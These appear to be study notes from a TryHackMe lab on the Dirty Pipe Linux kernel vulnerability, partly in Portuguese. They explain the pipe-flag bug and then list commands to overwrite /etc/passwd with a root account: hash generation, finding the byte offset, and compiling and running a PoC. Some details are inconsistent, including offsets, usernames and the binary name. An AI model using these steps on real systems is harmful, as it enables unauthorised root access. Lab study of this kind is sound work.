## Tutorial Exploit Background

his is the real crux of the vulnerability, and it can all be traced back to two commits in the Linux kernel:

-   A bug was introduced in [Linux Kernel v4.9 (2016)](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b) which allowed pipes to be created with arbitrary flags. None of the flags available at the time were in any way dangerous, so this wasn't an issue, until...  
    
-   [Linux Kernel v5.8 (2020)](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958) added a new flag — `PIPE_BUF_FLAG_CAN_MERGE` . In simple terms, this flag tells the kernel that the changes written to the page pointed to by the pipe should be written directly back to the file that the page comes from.

To summarise: we have a flag that allows us to tell the kernel to write the page back to the disk as data comes into it, we have a bug that allows us to specify arbitrary flags for a pipe, and we have a system call that inadvertently allows us to point pipes at page buffers which were opened as read-only. What could possibly go wrong?  

Put simply, the exploit first opens a target file with the read-only flag set — in order to do this, we must choose a file that we have permission to read. The exploit then prepares a pipe in a special way, forcing the addition of the `PIPE_BUF_FLAG_CAN_MERGE` flag. Next, it uses `splice()` to make the pipe point at the desired section of the target file. Finally, it writes whatever arbitrary data that the user has specified into the pipe, thereby overwriting the page buffer and — by merit of `PIPE_BUF_FLAG_CAN_MERGE` — overwriting the file on the disk.

## Practical A Weaponised PoC

Bearing in mind that the exploit won't let us _create_ files (we can only overwrite information in existing files), we first need to find a file our user can _read_, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is `/etc/passwd`. Whilst password hashes are usually stored in the restricted-access `/etc/shadow` in modern Linux systems (as opposed to being stored traditionally in `/etc/passwd`), most Linux variants do still check to see if account password hashes are given in `/etc/passwd`. This means that we can write a user with root permissions and a known password hash directly into the passwd file!

`openssl` command to create a SHA512Crypt hash of your chosen password:

```shell-session
$openssl passwd -6 --salt THM "PASSWORD"


$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.

'avataris12:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'

```


Our final content should therefore look something like this (quotes included):  
`'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash  
'`

substituir este user pelo novo indicando 182:

```
grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
run a exploit poc.c: 
```

compilar:
``` 
gcc poc.c -o exploit 

```

run a exploit:
```
./a.out /etc/passwd 189 'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash
> '

Password: TryHackMe123!

```